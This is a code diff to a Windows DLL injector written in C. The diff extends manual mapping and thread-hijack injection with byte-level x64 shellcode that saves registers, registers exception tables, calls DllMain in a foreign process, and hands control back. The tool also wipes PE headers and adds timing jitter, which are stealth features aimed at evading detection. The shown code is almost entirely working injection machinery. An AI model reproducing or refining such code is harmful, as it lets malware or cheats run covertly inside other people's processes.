@@ -188,8 +188,9 @@ static BOOL resolve_imports(char *image, DWORD image_size, IMAGE_NT_HEADERS *nt)
 
 /* Manual map: read DLL, prepare image locally (sections + relocations + imports),
  * write prepared image to target. Returns target base address; fills *entry_rva. */
-static LPVOID manual_map_dll(HANDLE proc, const char *dll_path, DWORD *entry_rva) {
-    *entry_rva = 0;
+static LPVOID manual_map_dll(HANDLE proc, const char *dll_path, DWORD *entry_rva,
+                             DWORD *pdata_rva, DWORD *pdata_size) {
+    *entry_rva = 0; *pdata_rva = 0; *pdata_size = 0;
 
     /* Read raw DLL from disk */
     HANDLE fh = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
@@ -327,6 +328,8 @@ static LPVOID manual_map_dll(HANDLE proc, const char *dll_path, DWORD *entry_rva
     }
 
     *entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
+    *pdata_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+    *pdata_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
     if (g_wipe) {
         char zeros[0x1000] = {0};
         SIZE_T wrote = 0;
@@ -344,7 +347,8 @@ static LPVOID manual_map_dll(HANDLE proc, const char *dll_path, DWORD *entry_rva
  * DllMain(dll_base, DLL_PROCESS_ATTACH, NULL) with proper x64 ABI,
  * then restores the thread to its original state. */
 static int hijack_thread(HANDLE proc, DWORD target_pid,
-                         LPVOID dll_base, DWORD entry_rva) {
+                         LPVOID dll_base, DWORD entry_rva,
+                         DWORD pdata_rva, DWORD pdata_size) {
     /* Find a thread in the TARGET process */
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (snap == INVALID_HANDLE_VALUE) {
@@ -394,60 +398,12 @@ static int hijack_thread(HANDLE proc, DWORD target_pid,
     ULONG_PTR orig_rsp = ctx.Rsp;
     printf("original RIP=%p RSP=%p\n", (void *)orig_rip, (void *)orig_rsp);
 
-    /* Build shellcode:
-     *   sub  rsp, 0x28                ; shadow space + 16-byte alignment
-     *   mov  rcx, <dll_base>          ; hModule
-     *   mov  edx, 1                   ; DLL_PROCESS_ATTACH
-     *   xor  r8d, r8d                 ; reserved = NULL
-     *   mov  rax, <entry_addr>        ; DllMain absolute address
-     *   call rax
-     *   add  rsp, 0x28
-     *   mov  rsp, <orig_rsp>          ; restore original stack pointer
-     *   mov  rax, <orig_rip>          ; original instruction pointer
-     *   jmp  rax                      ; resume original execution
-     */
+    /* Shellcode: save volatile regs, call DllMain, signal done, wait for go,
+     * restore everything and jump back. The handshake removes the RIP-poll
+     * race that made the injector force-restore a running thread. */
     ULONG_PTR entry_addr = (ULONG_PTR)dll_base + entry_rva;
 
-    unsigned char code[80];
-    int p = 0;
-
-    /* sub rsp, 0x28 */
-    code[p++] = 0x48; code[p++] = 0x83; code[p++] = 0xEC; code[p++] = 0x28;
-
-    /* mov rcx, imm64 (dll_base) */
-    code[p++] = 0x48; code[p++] = 0xB9;
-    memcpy(&code[p], &dll_base, 8); p += 8;
-
-    /* mov edx, 1 (DLL_PROCESS_ATTACH) */
-    code[p++] = 0xBA;
-    code[p++] = 0x01; code[p++] = 0x00; code[p++] = 0x00; code[p++] = 0x00;
-
-    /* xor r8d, r8d */
-    code[p++] = 0x45; code[p++] = 0x31; code[p++] = 0xC0;
-
-    /* mov rax, imm64 (entry_addr) */
-    code[p++] = 0x48; code[p++] = 0xB8;
-    memcpy(&code[p], &entry_addr, 8); p += 8;
-
-    /* call rax */
-    code[p++] = 0xFF; code[p++] = 0xD0;
-
-    /* add rsp, 0x28 */
-    code[p++] = 0x48; code[p++] = 0x83; code[p++] = 0xC4; code[p++] = 0x28;
-
-    /* mov rsp, imm64 (orig_rsp) */
-    code[p++] = 0x48; code[p++] = 0xBC;
-    memcpy(&code[p], &orig_rsp, 8); p += 8;
-
-    /* mov rax, imm64 (orig_rip) */
-    code[p++] = 0x48; code[p++] = 0xB8;
-    memcpy(&code[p], &orig_rip, 8); p += 8;
-
-    /* jmp rax */
-    code[p++] = 0xFF; code[p++] = 0xE0;
-
-    /* Allocate and write shellcode to target */
-    LPVOID sc = VirtualAllocEx(proc, NULL, 0x1000,
+    LPVOID sc = VirtualAllocEx(proc, NULL, 0x2000,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!sc) {
         fprintf(stderr, "shellcode alloc failed: %lu\n", GetLastError());
@@ -455,6 +411,48 @@ static int hijack_thread(HANDLE proc, DWORD target_pid,
         CloseHandle(thread);
         return 1;
     }
+    ULONG_PTR ctrl = (ULONG_PTR)sc + 0x1000;
+
+    unsigned char code[256];
+    int p = 0;
+#define E1(x) code[p++] = (unsigned char)(x)
+#define E8(v) do { ULONG_PTR _v = (ULONG_PTR)(v); memcpy(&code[p], &_v, 8); p += 8; } while (0)
+#define E4(v) do { unsigned _v = (unsigned)(v); memcpy(&code[p], &_v, 4); p += 4; } while (0)
+
+    E1(0x9C);                                        /* pushfq */
+    E1(0x50); E1(0x51); E1(0x52);                    /* push rax rcx rdx */
+    E1(0x41); E1(0x50); E1(0x41); E1(0x51);
+    E1(0x41); E1(0x52); E1(0x41); E1(0x53);          /* push r8..r11 */
+    E1(0x48); E1(0x83); E1(0xEC); E1(0x08);          /* sub rsp,8 */
+    if (pdata_rva && pdata_size >= sizeof(RUNTIME_FUNCTION)) {
+        ULONG_PTR pfn = (ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddFunctionTable");
+        if (pfn) {
+            E1(0x48); E1(0xB9); E8((ULONG_PTR)dll_base + pdata_rva);   /* mov rcx,table */
+            E1(0xBA); E4(pdata_size / sizeof(RUNTIME_FUNCTION));       /* mov edx,count */
+            E1(0x49); E1(0xB8); E8((ULONG_PTR)dll_base);               /* mov r8,base */
+            E1(0x48); E1(0xB8); E8(pfn);                               /* mov rax,fn */
+            E1(0xFF); E1(0xD0);                                        /* call rax */
+        }
+    }
+    E1(0x48); E1(0xB9); E8(dll_base);                /* mov rcx,dll_base */
+    E1(0xBA); E1(1); E1(0); E1(0); E1(0);            /* mov edx,1 */
+    E1(0x45); E1(0x31); E1(0xC0);                    /* xor r8d,r8d */
+    E1(0x48); E1(0xB8); E8(entry_addr);              /* mov rax,entry */
+    E1(0xFF); E1(0xD0);                              /* call rax */
+    E1(0x48); E1(0x83); E1(0xC4); E1(0x08);          /* add rsp,8 */
+    E1(0x49); E1(0xBA); E8(ctrl);                    /* mov r10,ctrl */
+    E1(0x41); E1(0xC7); E1(0x02); E1(1); E1(0); E1(0); E1(0); /* mov [r10],1 */
+    E1(0x41); E1(0x83); E1(0x7A); E1(0x04); E1(0x00);/* cmp [r10+4],0 */
+    E1(0x74); E1(0xF9);                              /* je spin */
+    E1(0x41); E1(0x5B); E1(0x41); E1(0x5A);
+    E1(0x41); E1(0x59); E1(0x41); E1(0x58);          /* pop r11..r8 */
+    E1(0x5A); E1(0x59); E1(0x58);                    /* pop rdx rcx rax */
+    E1(0x9D);                                        /* popfq */
+    E1(0x48); E1(0xBC); E8(orig_rsp);                /* mov rsp,orig_rsp */
+    E1(0x48); E1(0xB8); E8(orig_rip);                /* mov rax,orig_rip */
+    E1(0xFF); E1(0xE0);                              /* jmp rax */
+#undef E1
+#undef E8
 
     SIZE_T wrote = 0;
     WriteProcessMemory(proc, sc, code, p, &wrote);
@@ -478,43 +476,29 @@ static int hijack_thread(HANDLE proc, DWORD target_pid,
         return 1;
     }
 
-    /* Resume and poll for completion */
+    /* Resume, wait for the done flag, then let the shellcode continue. */
     printf("executing DllMain...\n");
     ResumeThread(thread);
 
     int elapsed = 0;
     BOOL completed = FALSE;
     while (elapsed < HIJACK_TIMEOUT_MS) {
-        Sleep(HIJACK_POLL_MS);
-        elapsed += HIJACK_POLL_MS;
-
-        SuspendThread(thread);
-
-        CONTEXT check;
-        memset(&check, 0, sizeof(check));
-        check.ContextFlags = CONTEXT_CONTROL;
-        if (GetThreadContext(thread, &check) && check.Rip == orig_rip) {
-            printf("DllMain returned, thread restored (RIP=%p, %dms)\n",
-                   (void *)check.Rip, elapsed);
-            ResumeThread(thread);
-            completed = TRUE;
-            break;
-        }
-        ResumeThread(thread);
+        DWORD done = 0;
+        SIZE_T n = 0;
+        if (ReadProcessMemory(proc, (LPCVOID)ctrl, &done, sizeof done, &n) &&
+            n == sizeof done && done) { completed = TRUE; break; }
+        Sleep(20);
+        elapsed += 20;
     }
-
-    if (!completed) {
-        fprintf(stderr, "warning: DllMain did not return within %dms, force-restoring\n",
+    if (completed) {
+        DWORD go = 1;
+        SIZE_T n = 0;
+        WriteProcessMemory(proc, (LPCVOID)(ctrl + 4), &go, sizeof go, &n);
+        printf("DllMain returned, thread released (%dms)\n", elapsed);
+        Sleep(100);
+    } else {
+        fprintf(stderr, "warning: DllMain did not signal done within %dms\n",
                 HIJACK_TIMEOUT_MS);
-        SuspendThread(thread);
-        CONTEXT restore;
-        memset(&restore, 0, sizeof(restore));
-        restore.ContextFlags = CONTEXT_FULL;
-        GetThreadContext(thread, &restore);
-        restore.Rip = orig_rip;
-        restore.Rsp = orig_rsp;
-        SetThreadContext(thread, &restore);
-        ResumeThread(thread);
     }
 
     /* Free shellcode (DllMain already returned, DLL's own threads are running) */
@@ -574,8 +558,8 @@ int main(int argc, char **argv) {
         }
     } else {
         /* Manual map the DLL */
-        DWORD entry_rva = 0;
-        LPVOID base = manual_map_dll(proc, argv[2], &entry_rva);
+        DWORD entry_rva = 0, pdata_rva = 0, pdata_size = 0;
+        LPVOID base = manual_map_dll(proc, argv[2], &entry_rva, &pdata_rva, &pdata_size);
         if (!base) {
             fprintf(stderr, "manual mapping failed\n");
             CloseHandle(proc);
@@ -591,7 +575,7 @@ int main(int argc, char **argv) {
 
         /* Hijack a target thread to call DllMain */
         jitter_sleep();
-        if (hijack_thread(proc, pid, base, entry_rva)) {
+        if (hijack_thread(proc, pid, base, entry_rva, pdata_rva, pdata_size)) {
             fprintf(stderr, "thread hijack failed\n");
             CloseHandle(proc);
             return 1;
